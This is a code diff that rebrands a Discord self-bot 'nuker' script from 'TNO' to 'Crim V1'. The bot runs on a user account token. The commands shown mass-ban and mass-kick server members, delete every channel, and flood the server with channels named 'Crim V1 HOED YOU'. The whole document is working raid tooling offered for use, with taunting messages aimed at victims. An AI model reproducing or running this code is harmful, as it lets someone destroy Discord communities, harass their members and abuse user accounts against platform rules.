@@ -8,10 +8,10 @@ import random
 
 prefix = "!"
 
-TNO = commands.Bot(command_prefix=prefix, self_bot=True)
-TNO.remove_command('help')
+CRIM = commands.Bot(command_prefix=prefix, self_bot=True)
+CRIM.remove_command('help')
 
-@TNO.event
+@CRIM.event
 async def on_connect():
     print(f'''{Fore.RED}
   _____               
@@ -32,7 +32,7 @@ Yb      88"Yb  88 88YbdP88     YbdP     88
                                                                                                
                                                                                ''')
 
-@TNO.command()
+@CRIM.command()
 async def help(ctx):
   
     embed = discord.Embed(title=" 𝘊𝘳𝘪𝘮 𝘷1💚💫", color= discord.Color(random.randint(0xffffff, 0xffffff)))
@@ -46,7 +46,7 @@ async def help(ctx):
     embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
     embed.set_image(url="https://cdn.discordapp.com/attachments/710124130330214493/748320923463188550/image0.gif")
     await ctx.send(embed=embed)
-@TNO.command()
+@CRIM.command()
 async def wizz(ctx):
     await ctx.message.delete()
     print(f"{Fore.RED}Starting Crim V1 Nuker...")
@@ -64,7 +64,7 @@ async def wizz(ctx):
             await ctx.guild.create_text_channel(name=f'Crim V1 HOED YOU💚💫')
             print(f"{Fore.WHITE}Added {channel.name}")
   
-@TNO.command()
+@CRIM.command()
 async def ban(ctx):
     await ctx.message.delete()
     await ctx.send("`Ban Starting...`")
@@ -82,10 +82,10 @@ async def ban(ctx):
             print (f"{user.name} has NOT been banned from {ctx.guild.name}")
 
 
-@TNO.command()
+@CRIM.command()
 async def kick(ctx):
     await ctx.message.delete()
-    await ctx.send("`TNO HOED YOU💚💫...`")
+    await ctx.send("`CRIM HOED YOU💚💫...`")
     show_avatar = discord.Embed(
 
      color=ctx.author.color 
@@ -100,7 +100,7 @@ async def kick(ctx):
             print (f"{user.name} has NOT been kicked from {ctx.guild.name}")
 
 
-@TNO.command()
+@CRIM.command()
 async def channels(ctx):
   await ctx.message.delete()
   print(f"{Fore.RED} Deleting Channels...")
@@ -111,7 +111,7 @@ async def channels(ctx):
     await ctx.guild.create_text_channel(name=f'Crim V1 HOED YOU💚💫')
     print(f"{Fore.RED}Added {channel.name}")
 
-@TNO.command()
+@CRIM.command()
 async def dash(ctx):
   await ctx.message.delete()
   print(f"{Fore.WHITE}Deleting Channels")
@@ -119,4 +119,4 @@ async def dash(ctx):
     await channel.delete()
   print(f"{Fore.RED} Deleted Channels")
 
-TNO.run('ADD-TOKEN-HERE', bot=False)
+CRIM.run('ADD-TOKEN-HERE', bot=False)
